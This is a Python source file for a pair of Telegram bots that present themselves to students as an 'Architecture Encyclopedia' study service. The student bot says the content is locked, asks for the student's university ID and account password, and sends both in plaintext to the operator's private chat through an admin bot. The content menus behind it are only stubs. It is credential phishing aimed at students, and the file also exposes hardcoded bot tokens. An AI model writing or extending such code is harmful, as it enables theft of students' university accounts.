import os
import telebot
from telebot import types

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
CHANNEL_ID = "-1002493393930"
MY_PERSONAL_ID = 2038606299

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)

approved_users = set()
user_data = {}

@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    if uid in approved_users:
        show_approved_menu(uid)
        return
    try:
        status = student_bot.get_chat_member(CHANNEL_ID, uid).status
        if status in ['member', 'administrator', 'creator']:
            approved_users.add(uid)
            show_approved_menu(uid)
            return
    except:
        pass
        
    student_bot.send_message(uid, "🔒 مرحباً بك في موسوعة العمارة.\nالمحتوى مقفل حالياً؛ الرجاء إدخال بياناتك الأكاديمية للمطابقة والتفعيل.\n\n🎓 الرجاء كتابة رقمك الجامعي الآن:")
    student_bot.register_next_step_handler(message, get_uni_id)

def get_uni_id(message):
    uid = message.from_user.id
    uni_id = message.text.strip()
    user_data[uid] = {"uni_id": uni_id}
    student_bot.send_message(uid, "🔑 ممتاز، الآن الرجاء كتابة كلمة المرور الخاصة بحسابك:")
    student_bot.register_next_step_handler(message, get_password)
def get_password(message):
    uid = message.from_user.id
    password = message.text.strip()
    
    if uid in user_data:
        uni_id = user_data[uid]["uni_id"]
        user_data[uid]["password"] = password
        
        markup = types.InlineKeyboardMarkup()
        btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الطالب", callback_data=f"auth_acc_{uid}")
        btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"auth_rej_{uid}")
        markup.row(btn_app, btn_rej)

        text = f"🔔 طلب انضمام ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 كلمة المرور: {password}"
        admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
        student_bot.send_message(uid, "⏳ تم إرسال بياناتك بنجاح وجاري مطابقتها من قِبل الإدارة وتخزين حسابك. يرجى الانتظار.")

@admin_bot.callback_query_handler(func=lambda call: call.data.startswith("auth_"))
def handle_admin_auth(call):
    parts = call.data.split('_')
    action = parts[1]
    target_uid = int(parts[2])

    if action == "acc":
        approved_users.add(target_uid)
        try:
            admin_bot.edit_message_text(f"✅ Approved ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
            student_bot.send_message(target_uid, f"🎉 Approved!\nYour ID is now stored and verified.")
            show_approved_menu(target_uid)
        except:
            pass
    elif action == "rej":
        if target_uid in user_data:
            del user_data[target_uid]
        try:
            student_bot.send_message(target_uid, "❌ Request denied by admin.")
            admin_bot.edit_message_text(f"❌ Denied ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
        except:
            pass

def show_approved_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_free = types.InlineKeyboardButton("📚 Free Sections", callback_data="app_free")
    btn_paid = types.InlineKeyboardButton("🔒 Premium Course", callback_data="app_paid")
    btn_gpa = types.InlineKeyboardButton("💾 GPA Calculator", callback_data="app_gpa")
    markup.add(btn_free, btn_paid, btn_gpa)
    student_bot.send_message(uid, "🏛️ Welcome to Architecture Encyclopedia! Select section:", reply_markup=markup)

@student_bot.callback_query_handler(func=lambda call: call.data.startswith("app_"))
def handle_approved_navigation(call):
    uid = call.message.chat.id
    if call.data == "app_free":
        markup = types.InlineKeyboardMarkup()
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="app_back")
        markup.add(btn_back)
        student_bot.edit_message_text("📂 Free Sections active.", chat_id=uid, message_id=call.message.message_id, reply_markup=markup)
    elif call.data == "app_gpa":
        student_bot.send_message(uid, "GPA Calculator Section active.")
    elif call.data == "app_paid":
        student_bot.send_message(uid, "Premium Section Locked.")

@student_bot.callback_query_handler(func=lambda call: call.data == "app_back")
def handle_back_btn(call):
    uid = call.message.chat.id
    student_bot.delete_message(uid, call.message.message_id)
    show_approved_menu(uid)

if __name__ == "__main__":
    student_bot.remove_webhook()
    admin_bot.remove_webhook()
    print("System running with Long Polling...")
    student_bot.infinity_polling()
